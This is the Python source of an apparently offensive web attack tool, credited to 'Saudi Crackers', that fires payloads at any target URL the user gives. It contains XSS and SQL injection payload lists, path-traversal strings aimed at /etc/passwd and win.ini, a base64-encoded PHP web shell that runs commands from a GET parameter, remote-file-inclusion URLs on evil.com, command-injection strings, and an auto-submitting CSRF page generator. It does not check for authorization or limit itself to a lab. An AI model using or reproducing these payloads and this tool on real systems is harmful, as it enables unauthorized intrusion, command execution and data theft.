#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Vulnerability Exploiter Tool
Developed by: Saudi Crackers
Email: SaudiLinux7@gmail.com

This tool extends the Site Analyzer functionality to provide exploitation techniques
for discovered vulnerabilities.
"""

import argparse
import json
import os
import random
import re
import requests
import socket
import ssl
import sys
import time
import urllib.parse
from bs4 import BeautifulSoup
from colorama import Fore, Back, Style, init
from datetime import datetime
from tqdm import tqdm

# Initialize colorama
init(autoreset=True)

# Banner
def print_banner():
    banner = f'''
{Fore.RED}╔═══════════════════════════════════════════════════════════════════════╗
{Fore.RED}║ {Fore.YELLOW}██╗   ██╗██╗   ██╗██╗     ███╗   ██╗    ███████╗██╗  ██╗██████╗ {Fore.RED} ║
{Fore.RED}║ {Fore.YELLOW}██║   ██║██║   ██║██║     ████╗  ██║    ██╔════╝╚██╗██╔╝██╔══██╗{Fore.RED} ║
{Fore.RED}║ {Fore.YELLOW}██║   ██║██║   ██║██║     ██╔██╗ ██║    █████╗   ╚███╔╝ ██████╔╝{Fore.RED} ║
{Fore.RED}║ {Fore.YELLOW}╚██╗ ██╔╝██║   ██║██║     ██║╚██╗██║    ██╔══╝   ██╔██╗ ██╔═══╝ {Fore.RED} ║
{Fore.RED}║ {Fore.YELLOW} ╚████╔╝ ╚██████╔╝███████╗██║ ╚████║    ███████╗██╔╝ ██╗██║     {Fore.RED} ║
{Fore.RED}║ {Fore.YELLOW}  ╚═══╝   ╚═════╝ ╚══════╝╚═╝  ╚═══╝    ╚══════╝╚═╝  ╚═╝╚═╝     {Fore.RED} ║
{Fore.RED}╠═══════════════════════════════════════════════════════════════════════╣
{Fore.RED}║ {Fore.CYAN}                 Vulnerability Exploiter v1.0                    {Fore.RED} ║
{Fore.RED}║ {Fore.CYAN}                  Developed by: Saudi Crackers                  {Fore.RED} ║
{Fore.RED}║ {Fore.CYAN}                  Email: SaudiLinux7@gmail.com                  {Fore.RED} ║
{Fore.RED}╚═══════════════════════════════════════════════════════════════════════╝
'''
    print(banner)

# User-Agent rotation
def get_random_user_agent():
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 11.5; rv:90.0) Gecko/20100101 Firefox/90.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15',
    ]
    return random.choice(user_agents)

# Request handler with retry mechanism
def make_request(url, method="GET", data=None, headers=None, cookies=None, timeout=10, max_retries=3, allow_redirects=True, verify=False, proxies=None):
    if headers is None:
        headers = {
            'User-Agent': get_random_user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
    
    for attempt in range(max_retries):
        try:
            response = requests.request(
                method,
                url,
                data=data,
                headers=headers,
                cookies=cookies,
                timeout=timeout,
                allow_redirects=allow_redirects,
                verify=verify,
                proxies=proxies
            )
            return response
        except requests.exceptions.RequestException as e:
            if attempt == max_retries - 1:
                print(f"{Fore.RED}[!] Error accessing {url}: {str(e)}")
                return None
            time.sleep(2)  # Wait before retrying
    return None

# Normalize URL
def normalize_url(url):
    if not url.startswith('http'):
        url = 'http://' + url
    return url

# Extract base domain from URL
def get_base_domain(url):
    parsed_url = urllib.parse.urlparse(url)
    return parsed_url.netloc

# Load vulnerabilities from site_analyzer results
def load_vulnerabilities(file_path):
    try:
        with open(file_path, 'r') as f:
            data = json.load(f)
            return data.get('vulnerabilities', [])
    except Exception as e:
        print(f"{Fore.RED}[!] Error loading vulnerabilities: {str(e)}")
        return []

# XSS exploitation techniques
def exploit_xss(url, params=None, cookies=None, headers=None):
    print(f"\n{Fore.CYAN}[*] Testing XSS exploitation on {url}...")
    
    xss_payloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\');">',
        '<svg/onload=alert("XSS")>',
        '"><script>alert("XSS")</script>',
        '"onmouseover="alert(\'XSS\')',
        '<iframe src="javascript:alert(`XSS`)"></iframe>',
        '<body onload=alert("XSS")>',
        '<a href="javascript:alert(`XSS`)">Click me</a>',
        '<div style="background-image: url(javascript:alert(\'XSS\'))">'  
    ]
    
    results = []
    
    # If no specific parameters provided, try to find forms on the page
    if not params:
        response = make_request(url)
        if not response:
            return results
        
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        for form in forms:
            form_action = form.get('action', '')
            if not form_action:
                form_action = url
            elif not form_action.startswith('http'):
                form_action = urllib.parse.urljoin(url, form_action)
            
            form_method = form.get('method', 'get').lower()
            form_inputs = form.find_all(['input', 'textarea'])
            
            form_params = {}
            for input_field in form_inputs:
                input_name = input_field.get('name')
                if input_name:
                    form_params[input_name] = input_field.get('value', '')
            
            # Test each payload in each parameter
            for param_name in form_params.keys():
                for payload in xss_payloads:
                    test_params = form_params.copy()
                    test_params[param_name] = payload
                    
                    if form_method == 'post':
                        response = make_request(form_action, method="POST", data=test_params, headers=headers, cookies=cookies)
                    else:
                        response = make_request(form_action, method="GET", data=test_params, headers=headers, cookies=cookies)
                    
                    if response and payload in response.text:
                        results.append({
                            'url': form_action,
                            'method': form_method,
                            'param': param_name,
                            'payload': payload,
                            'form_id': form.get('id', 'unknown'),
                            'success': True
                        })
                        print(f"{Fore.GREEN}[+] XSS vulnerability confirmed in form at {form_action}")
                        print(f"{Fore.GREEN}[+] Method: {form_method.upper()}, Parameter: {param_name}, Payload: {payload}")
    
    # If specific parameters provided, test them directly
    else:
        for param_name, param_value in params.items():
            for payload in xss_payloads:
                test_params = params.copy()
                test_params[param_name] = payload
                
                response = make_request(url, method="GET", data=test_params, headers=headers, cookies=cookies)
                
                if response and payload in response.text:
                    results.append({
                        'url': url,
                        'method': 'get',
                        'param': param_name,
                        'payload': payload,
                        'success': True
                    })
                    print(f"{Fore.GREEN}[+] XSS vulnerability confirmed at {url}")
                    print(f"{Fore.GREEN}[+] Parameter: {param_name}, Payload: {payload}")
    
    if not results:
        print(f"{Fore.YELLOW}[!] No exploitable XSS vulnerabilities found")
    
    return results

# SQL Injection exploitation techniques
def exploit_sql_injection(url, params=None, cookies=None, headers=None):
    print(f"\n{Fore.CYAN}[*] Testing SQL Injection exploitation on {url}...")
    
    sql_payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "' OR '1'='1'/*",
        "\" OR \"1\"=\"1",
        "\" OR \"1\"=\"1\" --",
        "admin' --",
        "admin' #",
        "' UNION SELECT 1,2,3,4,5 --",
        "' UNION SELECT 1,2,3,4,5,6 --",
        "' UNION SELECT 1,2,3,4,5,6,7 --",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --"
    ]
    
    error_patterns = [
        "SQL syntax",
        "mysql_fetch",
        "MySQLSyntaxErrorException",
        "ORA-01756",
        "PostgreSQL",
        "SQLite3::",
        "SQLSTATE[",
        "Microsoft SQL",
        "ODBC Driver",
        "DB2 SQL",
        "Sybase message"
    ]
    
    results = []
    
    # If no specific parameters provided, try to find forms on the page
    if not params:
        response = make_request(url)
        if not response:
            return results
        
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        for form in forms:
            form_action = form.get('action', '')
            if not form_action:
                form_action = url
            elif not form_action.startswith('http'):
                form_action = urllib.parse.urljoin(url, form_action)
            
            form_method = form.get('method', 'get').lower()
            form_inputs = form.find_all(['input', 'textarea'])
            
            form_params = {}
            for input_field in form_inputs:
                input_name = input_field.get('name')
                if input_name:
                    form_params[input_name] = input_field.get('value', '')
            
            # Test each payload in each parameter
            for param_name in form_params.keys():
                for payload in sql_payloads:
                    test_params = form_params.copy()
                    test_params[param_name] = payload
                    
                    if form_method == 'post':
                        response = make_request(form_action, method="POST", data=test_params, headers=headers, cookies=cookies)
                    else:
                        response = make_request(form_action, method="GET", data=test_params, headers=headers, cookies=cookies)
                    
                    if response:
                        # Check for SQL errors in response
                        for pattern in error_patterns:
                            if pattern in response.text:
                                results.append({
                                    'url': form_action,
                                    'method': form_method,
                                    'param': param_name,
                                    'payload': payload,
                                    'error': pattern,
                                    'form_id': form.get('id', 'unknown'),
                                    'success': True
                                })
                                print(f"{Fore.GREEN}[+] SQL Injection vulnerability confirmed in form at {form_action}")
                                print(f"{Fore.GREEN}[+] Method: {form_method.upper()}, Parameter: {param_name}, Payload: {payload}")
                                print(f"{Fore.GREEN}[+] Error pattern detected: {pattern}")
                                break
    
    # If specific parameters provided, test them directly
    else:
        for param_name, param_value in params.items():
            for payload in sql_payloads:
                test_params = params.copy()
                test_params[param_name] = payload
                
                response = make_request(url, method="GET", data=test_params, headers=headers, cookies=cookies)
                
                if response:
                    # Check for SQL errors in response
                    for pattern in error_patterns:
                        if pattern in response.text:
                            results.append({
                                'url': url,
                                'method': 'get',
                                'param': param_name,
                                'payload': payload,
                                'error': pattern,
                                'success': True
                            })
                            print(f"{Fore.GREEN}[+] SQL Injection vulnerability confirmed at {url}")
                            print(f"{Fore.GREEN}[+] Parameter: {param_name}, Payload: {payload}")
                            print(f"{Fore.GREEN}[+] Error pattern detected: {pattern}")
                            break
    
    if not results:
        print(f"{Fore.YELLOW}[!] No exploitable SQL Injection vulnerabilities found")
    
    return results

# CSRF exploitation techniques
def exploit_csrf(url, cookies=None, headers=None):
    print(f"\n{Fore.CYAN}[*] Testing CSRF exploitation on {url}...")
    
    results = []
    
    response = make_request(url, cookies=cookies, headers=headers)
    if not response:
        return results
    
    soup = BeautifulSoup(response.text, 'html.parser')
    forms = soup.find_all('form')
    
    for form in forms:
        form_action = form.get('action', '')
        if not form_action:
            form_action = url
        elif not form_action.startswith('http'):
            form_action = urllib.parse.urljoin(url, form_action)
        
        form_method = form.get('method', 'get').lower()
        form_inputs = form.find_all(['input', 'textarea'])
        
        # Check if the form has CSRF protection
        csrf_tokens = []
        for input_field in form_inputs:
            input_name = input_field.get('name', '').lower()
            if 'csrf' in input_name or 'token' in input_name or '_token' in input_name:
                csrf_tokens.append(input_field)
        
        if not csrf_tokens:
            # Generate CSRF PoC
            csrf_poc = f"<html>\n"
            csrf_poc += f"  <body>\n"
            csrf_poc += f"    <h1>CSRF Proof of Concept</h1>\n"
            csrf_poc += f"    <form action=\"{form_action}\" method=\"{form_method}\" id=\"csrf-form\">\n"
            
            for input_field in form_inputs:
                input_name = input_field.get('name')
                input_value = input_field.get('value', '')
                input_type = input_field.get('type', 'text')
                
                if input_name and input_type != 'submit' and input_type != 'button':
                    csrf_poc += f"      <input type=\"{input_type}\" name=\"{input_name}\" value=\"{input_value}\" />\n"
            
            csrf_poc += f"      <input type=\"submit\" value=\"Submit\" />\n"
            csrf_poc += f"    </form>\n"
            csrf_poc += f"    <script>\n"
            csrf_poc += f"      // Auto-submit the form when the page loads\n"
            csrf_poc += f"      document.getElementById('csrf-form').submit();\n"
            csrf_poc += f"    </script>\n"
            csrf_poc += f"  </body>\n"
            csrf_poc += f"</html>"
            
            results.append({
                'url': form_action,
                'method': form_method,
                'form_id': form.get('id', 'unknown'),
                'csrf_poc': csrf_poc,
                'success': True
            })
            
            print(f"{Fore.GREEN}[+] Potential CSRF vulnerability found in form at {form_action}")
            print(f"{Fore.GREEN}[+] Method: {form_method.upper()}, Form ID: {form.get('id', 'unknown')}")
            print(f"{Fore.GREEN}[+] CSRF PoC generated")
    
    if not results:
        print(f"{Fore.YELLOW}[!] No exploitable CSRF vulnerabilities found")
    
    return results

# File Inclusion exploitation techniques
def exploit_file_inclusion(url, params=None, cookies=None, headers=None):
    print(f"\n{Fore.CYAN}[*] Testing File Inclusion exploitation on {url}...")
    
    lfi_payloads = [
        "../../../../../../../etc/passwd",
        "../../../../../../../etc/hosts",
        "../../../../../../../windows/win.ini",
        "../../../../../../../boot.ini",
        "../../../../../../../windows/system32/drivers/etc/hosts",
        "....//....//....//....//....//....//etc/passwd",
        "....\\....\\....\\....\\....\\....\\windows\\win.ini",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/convert.base64-encode/resource=config.php",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4="  # <?php system($_GET['cmd']);echo 'Shell done !'; ?>
    ]
    
    rfi_payloads = [
        "http://evil.com/shell.txt",
        "https://pastebin.com/raw/Abc123De",  # Example pastebin URL
        "ftp://evil.com/shell.txt",
        "\\\\evil.com\\shell.txt"
    ]
    
    lfi_patterns = [
        "root:x:",
        "\[boot loader\]",
        "\[fonts\]",
        "127.0.0.1",
        "localhost",
        "\[MCI Extensions.BAK\]",
        "PD9waHAg"  # Base64 encoded <?php
    ]
    
    results = []
    
    # If no specific parameters provided, extract them from URL
    if not params:
        parsed_url = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        params = {k: v[0] for k, v in query_params.items()}
    
    # Test each parameter for LFI
    for param_name, param_value in params.items():
        # Test LFI payloads
        for payload in lfi_payloads:
            test_url = re.sub(f"{param_name}=[^&]+", f"{param_name}={urllib.parse.quote(payload)}", url)
            if test_url == url:  # If parameter wasn't in the URL
                parsed_url = urllib.parse.urlparse(url)
                if parsed_url.query:
                    test_url = f"{url}&{param_name}={urllib.parse.quote(payload)}"
                else:
                    test_url = f"{url}?{param_name}={urllib.parse.quote(payload)}"
            
            response = make_request(test_url, cookies=cookies, headers=headers)
            
            if response:
                for pattern in lfi_patterns:
                    if re.search(pattern, response.text):
                        results.append({
                            'url': test_url,
                            'type': 'LFI',
                            'param': param_name,
                            'payload': payload,
                            'pattern': pattern,
                            'success': True
                        })
                        print(f"{Fore.GREEN}[+] LFI vulnerability confirmed at {url}")
                        print(f"{Fore.GREEN}[+] Parameter: {param_name}, Payload: {payload}")
                        print(f"{Fore.GREEN}[+] Pattern detected: {pattern}")
                        break
        
        # Test RFI payloads
        for payload in rfi_payloads:
            test_url = re.sub(f"{param_name}=[^&]+", f"{param_name}={urllib.parse.quote(payload)}", url)
            if test_url == url:  # If parameter wasn't in the URL
                parsed_url = urllib.parse.urlparse(url)
                if parsed_url.query:
                    test_url = f"{url}&{param_name}={urllib.parse.quote(payload)}"
                else:
                    test_url = f"{url}?{param_name}={urllib.parse.quote(payload)}"
            
            # Note: We don't actually make this request as it would try to access potentially malicious URLs
            # In a real scenario, you would set up a controlled server to test RFI
            results.append({
                'url': test_url,
                'type': 'RFI',
                'param': param_name,
                'payload': payload,
                'note': 'RFI payload generated. In a real scenario, set up a controlled server to verify.',
                'success': False  # Set to False as we didn't actually verify
            })
            print(f"{Fore.YELLOW}[!] Potential RFI payload generated for {url}")
            print(f"{Fore.YELLOW}[!] Parameter: {param_name}, Payload: {payload}")
            print(f"{Fore.YELLOW}[!] Note: Set up a controlled server to verify this vulnerability")
    
    if not results:
        print(f"{Fore.YELLOW}[!] No exploitable File Inclusion vulnerabilities found")
    
    return results

# Command Injection exploitation techniques
def exploit_command_injection(url, params=None, cookies=None, headers=None):
    print(f"\n{Fore.CYAN}[*] Testing Command Injection exploitation on {url}...")
    
    cmd_payloads = [
        ";id",
        "| id",
        "& id",
        "&& id",
        "|| id",
        "`id`",
        "$(id)",
        ";whoami",
        "| whoami",
        "& whoami",
        "&& whoami",
        "|| whoami",
        "`whoami`",
        "$(whoami)",
        ";echo 'VULNERABLE';",
        "| echo 'VULNERABLE' |",
        "& echo 'VULNERABLE' &",
        "&& echo 'VULNERABLE' &&",
        "|| echo 'VULNERABLE' ||",
        "`echo 'VULNERABLE'`",
        "$(echo 'VULNERABLE')"
    ]
    
    cmd_patterns = [
        "uid=",
        "gid=",
        "groups=",
        "root",
        "admin",
        "VULNERABLE",
        "www-data",
        "\\b\\d{1,4}\\(\\w+\\)\\b"  # Process ID pattern
    ]
    
    results = []
    
    # If no specific parameters provided, extract them from URL
    if not params:
        parsed_url = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        params = {k: v[0] for k, v in query_params.items()}
        
        # Also check for forms
        response = make_request(url, cookies=cookies, headers=headers)
        if response:
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                form_action = form.get('action', '')
                if not form_action:
                    form_action = url
                elif not form_action.startswith('http'):
                    form_action = urllib.parse.urljoin(url, form_action)
                
                form_method = form.get('method', 'get').lower()
                form_inputs = form.find_all(['input', 'textarea'])
                
                form_params = {}
                for input_field in form_inputs:
                    input_name = input_field.get('name')
                    if input_name:
                        form_params[input_name] = input_field.get('value', '')
                
                # Test each payload in each parameter
                for param_name in form_params.keys():
                    for payload in cmd_payloads:
                        test_params = form_params.copy()
                        test_params[param_name] = payload
                        
                        if form_method == 'post':
                            response = make_request(form_action, method="POST", data=test_params, headers=headers, cookies=cookies)
                        else:
                            response = make_request(form_action, method="GET", data=test_params, headers=headers, cookies=cookies)
                        
                        if response:
                            for pattern in cmd_patterns:
                                if re.search(pattern, response.text):
                                    results.append({
                                        'url': form_action,
                                        'method': form_method,
                                        'param': param_name,
                                        'payload': payload,
                                        'pattern': pattern,
                                        'form_id': form.get('id', 'unknown'),
                                        'success': True
                                    })
                                    print(f"{Fore.GREEN}[+] Command Injection vulnerability confirmed in form at {form_action}")
                                    print(f"{Fore.GREEN}[+] Method: {form_method.upper()}, Parameter: {param_name}, Payload: {payload}")
                                    print(f"{Fore.GREEN}[+] Pattern detected: {pattern}")
                                    break
    
    # Test URL parameters
    for param_name, param_value in params.items():
        for payload in cmd_payloads:
            test_url = re.sub(f"{param_name}=[^&]+", f"{param_name}={urllib.parse.quote(payload)}", url)
            if test_url == url:  # If parameter wasn't in the URL
                parsed_url = urllib.parse.urlparse(url)
                if parsed_url.query:
                    test_url = f"{url}&{param_name}={urllib.parse.quote(payload)}"
                else:
                    test_url = f"{url}?{param_name}={urllib.parse.quote(payload)}"
            
            response = make_request(test_url, cookies=cookies, headers=headers)
            
            if response:
                for pattern in cmd_patterns:
                    if re.search(pattern, response.text):
                        results.append({
                            'url': test_url,
                            'method': 'get',
                            'param': param_name,
                            'payload': payload,
                            'pattern': pattern,
                            'success': True
                        })
                        print(f"{Fore.GREEN}[+] Command Injection vulnerability confirmed at {url}")
                        print(f"{Fore.GREEN}[+] Parameter: {param_name}, Payload: {payload}")
                        print(f"{Fore.GREEN}[+] Pattern detected: {pattern}")
                        break
    
    if not results:
        print(f"{Fore.YELLOW}[!] No exploitable Command Injection vulnerabilities found")
    
    return results

# Generate exploitation report
def generate_report(target, results, output_file=None):
    report = {
        'target': target,
        'scan_date': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'results': results
    }
    
    if output_file:
        try:
            with open(output_file, 'w') as f:
                json.dump(report, f, indent=4)
            print(f"\n{Fore.GREEN}[+] Exploitation report saved to {output_file}")
        except Exception as e:
            print(f"\n{Fore.RED}[!] Error saving report: {str(e)}")
    
    return report

# Main function
def main():
    parser = argparse.ArgumentParser(description="Vulnerability Exploiter Tool")
    parser.add_argument("-t", "--target", required=True, help="Target URL")
    parser.add_argument("-i", "--input", help="Input file with vulnerabilities (from site_analyzer)")
    parser.add_argument("-o", "--output", help="Output file for exploitation results")
    parser.add_argument("--xss", action="store_true", help="Test for XSS vulnerabilities")
    parser.add_argument("--sqli", action="store_true", help="Test for SQL Injection vulnerabilities")
    parser.add_argument("--csrf", action="store_true", help="Test for CSRF vulnerabilities")
    parser.add_argument("--lfi", action="store_true", help="Test for LFI/RFI vulnerabilities")
    parser.add_argument("--cmdi", action="store_true", help="Test for Command Injection vulnerabilities")
    parser.add_argument("--all", action="store_true", help="Test for all vulnerabilities")
    parser.add_argument("--cookies", help="Cookies to use (format: name1=value1; name2=value2)")
    parser.add_argument("--proxy", help="Proxy to use (format: http://127.0.0.1:8080)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds")
    parser.add_argument("--no-color", action="store_true", help="Disable colored output")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose output")
    
    args = parser.parse_args()
    
    # Disable colors if requested
    if args.no_color:
        init(autoreset=True, strip=True)
    
    # Print banner
    print_banner()
    
    # Normalize target URL
    target = normalize_url(args.target)
    print(f"{Fore.GREEN}[+] Starting exploitation of {target}")
    
    # Parse cookies
    cookies = None
    if args.cookies:
        cookies = {}
        for cookie in args.cookies.split(';'):
            if '=' in cookie:
                name, value = cookie.strip().split('=', 1)
                cookies[name] = value
    
    # Setup proxy
    proxies = None
    if args.proxy:
        proxies = {
            'http': args.proxy,
            'https': args.proxy
        }
    
    # Load vulnerabilities from input file if provided
    vulnerabilities = []
    if args.input:
        vulnerabilities = load_vulnerabilities(args.input)
        print(f"{Fore.GREEN}[+] Loaded {len(vulnerabilities)} vulnerabilities from {args.input}")
    
    # Initialize results
    results = {
        'xss': [],
        'sql_injection': [],
        'csrf': [],
        'file_inclusion': [],
        'command_injection': []
    }
    
    # Test for XSS vulnerabilities
    if args.xss or args.all:
        results['xss'] = exploit_xss(target, cookies=cookies)
    
    # Test for SQL Injection vulnerabilities
    if args.sqli or args.all:
        results['sql_injection'] = exploit_sql_injection(target, cookies=cookies)
    
    # Test for CSRF vulnerabilities
    if args.csrf or args.all:
        results['csrf'] = exploit_csrf(target, cookies=cookies)
    
    # Test for File Inclusion vulnerabilities
    if args.lfi or args.all:
        results['file_inclusion'] = exploit_file_inclusion(target, cookies=cookies)
    
    # Test for Command Injection vulnerabilities
    if args.cmdi or args.all:
        results['command_injection'] = exploit_command_injection(target, cookies=cookies)
    
    # Generate and save report
    output_file = args.output
    if not output_file:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = f"vuln_exploit_{get_base_domain(target)}_{timestamp}.json"
    
    report = generate_report(target, results, output_file)
    
    # Print summary
    print("\n" + "=" * 60)
    print(f"{Fore.YELLOW}Exploitation Summary:{Style.RESET_ALL}")
    print(f"Target: {target}")
    print(f"XSS Vulnerabilities: {len(results['xss'])}")
    print(f"SQL Injection Vulnerabilities: {len(results['sql_injection'])}")
    print(f"CSRF Vulnerabilities: {len(results['csrf'])}")
    print(f"File Inclusion Vulnerabilities: {len(results['file_inclusion'])}")
    print(f"Command Injection Vulnerabilities: {len(results['command_injection'])}")
    print("=" * 60)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Exploitation aborted by user")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {str(e)}")